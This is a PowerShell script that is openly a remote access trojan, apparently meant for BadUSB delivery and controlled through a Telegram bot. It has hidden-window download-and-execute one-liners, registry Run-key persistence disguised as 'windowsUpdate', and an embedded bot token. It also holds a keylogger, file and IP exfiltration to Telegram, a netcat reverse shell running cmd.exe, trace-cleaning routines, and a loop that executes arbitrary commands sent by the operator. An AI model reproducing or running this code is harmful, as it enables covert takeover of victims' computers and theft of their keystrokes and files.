
<#  
BADUSB COMMANDS:
    # Execute 
    powershell.exe -windowstyle hidden -file this_file.ps1
    #Execute script from github
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
REGEDIT:
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
    https://www.akadia.com/services/windows_registry.html 
BOT TELEGRAM:
    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
	#>


############
## CONFIG ##
############

$BotToken = "1769873413:AAH6MN13VSruSAWAimBrEmELnLy1MzHm7q8"
$ChatID = '928905258'
$githubScript = 'https://raw.githubusercontent.com/halitAKAYDIN/PSBoTelegram/master/poc.ps1'


###############
## FUNCTIONS ##
###############

function backdoor {
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
        
        Send-Message "Downloading.."
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1

        Send-Message "Adding_to_the_reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"

        # Check backdoor
        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        # Backdoor on startup programs
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command
}


function cleanAll {
    # Remove screenshots
    Send-Message "Deleting_screenshots.."
    Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
    # Remove cUrl
    Send-Message "Deleting_cURL.."
    Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
    # Remove backdoor
    Send-Message "Deleting_backdoor.."
    Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
    # Remove webcam
    Send-Message "Deleting_webcam.."
    Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
    # Remove netcat
    Send-Message "Deleting_netcat.."
    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
    Remove-Item "C:\Users\$env:username\Documents\nc.zip"
}

function installCurl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl    
}


function Send-Message($message) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
}

function ipPublic {
    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
}

function download($FileToDownload) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
}

function keylogger($seconds) {
  # Requires -Version 2
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $Path = "$env:temp\keylogger.txt"

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try {
    Write-Host 'Recording..'
    Send-Message 'Recording..'

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    $timeout = new-timespan -Seconds  $time
    $sw = [diagnostics.stopwatch]::StartNew()
    while ($sw.elapsed -lt $timeout) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)


          if ($success) {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }

  finally {
    # open logger file in Notepad - Only for test
    #notepad $Path

    Write-Host "Downloading keylogger file.."
    Send-Message 'Downloading..'
    download $Path

    Start-Sleep -Seconds 5
    Write-Host "Deleting keylogger file.."
    Send-Message 'Deleting..'
    Remove-Item $Path
  }
}

function mainBrowser {
    Send-Message "Checking_main_browser_on_the_reg.."
    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice

    if ($mainBrowser -match 'chrome') {
        Send-Message "Chrome!"
        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        if(![System.IO.File]::Exists($chrome)){
            $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
            Send-Message "Chrome x64!"
            return $chrome
        }
        Send-Message "Chromex86!"
        return $chrome
     }

    ElseIf ($mainBrowser -match 'Firefox') {
        Send-Message "Firefox!"
        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
        if(![System.IO.File]::Exists($firefox)){
            $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
            Send-Message "Firefox x64!"
            return $firefox
        }
        Send-Message "Firefoxx86!"
        return $firefox
     }
}

function netcat($ip) {
    Send-Message "Downloading_netcat.."
    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
    $outpath = "C:\Users\$env:username\Documents\nc.zip"
    $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath
    
    Start-Sleep -Seconds 5
    Expand-Archive $outpath -DestinationPath $outpathUnzip
    $args = "$ip 8888 -e cmd.exe"
    $netcat = $outpathUnzip+"\nc.exe"

    Start-Sleep -Seconds 5
    Send-Message "Connecting.."
    Send-Message "IP:$ip"
    Send-Message "Port:8888"
    Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
}

function stopnetcat {
    Send-Message "Stopping_netcat.."
    taskkill /F /IM nc.exe
    
    Sleep -Seconds 5
    Send-Message "Deleting_netcat.."
    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
    Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
}


#####################
## BYPASS POLICIES ##
#####################

# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


##########################
## CONNECT WITH CHANNEL ##
##########################

$whoami = Invoke-Expression whoami
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString
$hostname = Invoke-Expression hostname
$pwd = pwd

$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)


######################
## WAIT FOR COMMAND ##
######################

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 3
 
 
#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
		
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $pwd = pwd
        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
	  }
	  "/stop $ipV4"  {
		#The user wants to stop the script
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
      "/ipPublic $ipV4" {
        ipPublic
      }
      "/download $ipV4 *"{
        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
        download $FileToDownload
      }
      "/keylogger $ipV4 *"{
        $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
        keylogger seconds $time
      }
      "/nc $ipV4 *"{
        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
        netcat $ip
      }
      "/stopnc $ipV4"{
        stopnetcat
      }
	  default  {
	    #The message sent is unknown
		    $Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		    $SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
      		}
	  }
	}
}
